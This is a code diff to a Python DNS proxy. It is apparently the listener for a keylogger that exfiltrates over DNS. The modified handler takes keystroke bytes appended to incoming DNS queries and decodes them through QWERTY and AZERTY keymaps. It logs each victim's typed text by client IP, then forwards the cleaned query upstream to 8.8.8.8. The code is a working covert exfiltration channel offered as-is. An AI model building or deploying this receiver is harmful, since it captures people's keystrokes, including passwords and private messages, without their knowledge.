@@ -1,42 +1,21 @@
+import yaml
+import json
 import socket
 
-# Define proxy configuration
+from dnslib import DNSRecord,RCODE,QTYPE
+from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
+
+
 LOCAL_HOST = '0.0.0.0'      # Listen on all available interfaces
 LOCAL_PORT = 53           # Port for the UDP proxy to listen on
 REMOTE_HOST = '8.8.8.8'  # Replace with the remote server's IP
 REMOTE_PORT = 53              # Port of the remote server
+qw_key_map =yaml.safe_load(open("qwerty.yml"))
+az_key_map =yaml.safe_load(open("azerty.yml"))
+key_maps={0:qw_key_map,1:az_key_map}
+keys = {}
 
-
-import binascii,socket,struct
-
-from dnslib import DNSRecord,RCODE,QTYPE,RR,RD
-from dnslib.server import DNSServer,DNSHandler,BaseResolver,DNSLogger
-
-import yaml
-key_map =yaml.safe_load(open("keymap.yml"))
-keys=[]
 class ProxyResolver(BaseResolver):
-    """
-        Proxy resolver - passes all requests to upstream DNS server and
-        returns response
-
-        Note that the request/response will be each be decoded/re-encoded
-        twice:
-
-        a) Request packet received by DNSHandler and parsed into DNSRecord
-        b) DNSRecord passed to ProxyResolver, serialised back into packet
-           and sent to upstream DNS server
-        c) Upstream DNS server returns response packet which is parsed into
-           DNSRecord
-        d) ProxyResolver returns DNSRecord to DNSHandler which re-serialises
-           this into packet and returns to client
-
-        In practice this is actually fairly useful for testing but for a
-        'real' transparent proxy option the DNSHandler logic needs to be
-        modified (see PassthroughDNSHandler)
-
-    """
-
     def __init__(self,address,port,timeout=0,strip_aaaa=False):
         self.address = address
         self.port = port
@@ -63,47 +42,41 @@ class ProxyResolver(BaseResolver):
         return reply
 
 class PassthroughDNSHandler(DNSHandler):
-    """
-        Modify DNSHandler logic (get_reply method) to send directly to
-        upstream DNS server rather then decoding/encoding packet and
-        passing to Resolver (The request/response packets are still
-        parsed and logged but this is not inline)
-    """
+
     def get_reply(self,data):
         host,port = self.server.resolver.address,self.server.resolver.port
+        client_ip = str(self.client_address[0])
+        if not keys.get(client_ip):
+            keys[client_ip]=[]
+
         try:
-            payload  = data[-4:]
-            keys.extend([key_map.get(x,'') for x in payload ])
-            res = "".join(keys)
-            res=res.replace("󱁐 "," ")
-            print(f"\rPAYLOAD IS: {res}", end="")
+            payload  = data[-8:]
+            key_events  = zip(payload[::2],payload[1::2])
+            for (layout,code) in key_events:
+                if key_map := key_maps.get(layout):
+                    keys[client_ip].append(key_map.get(code,''))
+            
+            res={}
+            for client_ip,k in keys.items():
+                res[client_ip] = "".join(k)
+                print(f"\rPAYLOAD IS:\n{json.dumps(res,indent=2)}", end="")
        
         except:
             pass
        
-        data = bytearray(data[:-4])
+        data = bytearray(data[:-8])
         data[2:4] = bytes.fromhex("0120")
 
         request = DNSRecord.parse(bytes(data))
-      
-        
         self.server.logger.log_request(self,request)
-  
-
-   
         response = send_udp(data,host,port)
-
         reply = DNSRecord.parse(response)
         self.server.logger.log_reply(self,reply)
-
         return response
 
 
 
 def send_udp(data,host,port):
-    """
-        Helper function to send/receive DNS UDP request
-    """
     sock = None
     try:
         sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
@@ -116,7 +89,7 @@ def send_udp(data,host,port):
 
 if __name__ == '__main__':
 
-    import argparse,sys,time
+    import argparse,time
 
     p = argparse.ArgumentParser(description="DNS Proxy")
     p.add_argument("--port","-p",type=int,default=53,
@@ -151,72 +124,14 @@ if __name__ == '__main__':
                         args.dns,args.dns_port,
                         "UDP/TCP" if args.tcp else "UDP"))
 
-    resolver = ProxyResolver(args.dns,args.dns_port,args.timeout,args.strip_aaaa)
-    handler = PassthroughDNSHandler if args.passthrough else DNSHandler
-    logger = DNSLogger(args.log,prefix=args.log_prefix)
     
-    udp_server = DNSServer(resolver,
+    udp_server = DNSServer( ProxyResolver(args.dns,args.dns_port,args.timeout,args.strip_aaaa),
                            port=args.port,
                            address=args.address,
-                           logger=logger,
-                           handler=handler)
+                           logger=DNSLogger(args.log,prefix=args.log_prefix),
+                           handler=PassthroughDNSHandler)
     udp_server.start()
 
 
     while udp_server.isAlive():
         time.sleep(1)
-
-
-
-
-
-
-
-
-
-
-
-
-
-# Unpack the first 4 bytes as an integer and the rest as a string
-
-# Create UDP socket for the proxy
-# proxy_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-# proxy_socket.bind((LOCAL_HOST, LOCAL_PORT))
-# print(f"UDP Proxy listening on {LOCAL_HOST}:{LOCAL_PORT}")
-
-# # Create a UDP socket for communicating with the remote server
-# remote_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-
-
-# try:
-#     while True:
-#         # Receive data from the client
-#         data, client_address = proxy_socket.recvfrom(2**16)  # Buffer size can be adjusted
-#         print(f"Received {len(data)} bytes from {client_address}")
-
-        
-#         payload = data
-#         print( memoryview(payload).tolist())
-        
-#         print(bytes(memoryview(payload)).hex())
-#         #print(f"payload data : {payload.decode()}")
-
-#         # Forward the data to the remote server
-#         remote_socket.sendto(data, (REMOTE_HOST, REMOTE_PORT))
-#         print(f"Forwarded data to {REMOTE_HOST}:{REMOTE_PORT}")
-
-#         # Receive response from the remote server
-#         response, _ = remote_socket.recvfrom(2**16)
-#         print(f"Received {len(response)} bytes from remote server")
-
-#         # Send the response back to the client
-#         proxy_socket.sendto(response, client_address)
-#         print(f"Sent response back to client {client_address}")
-
-# except KeyboardInterrupt:
-#     print("UDP Proxy shutting down.")
-# finally:
-#     proxy_socket.close()
-#     remote_socket.close()
-
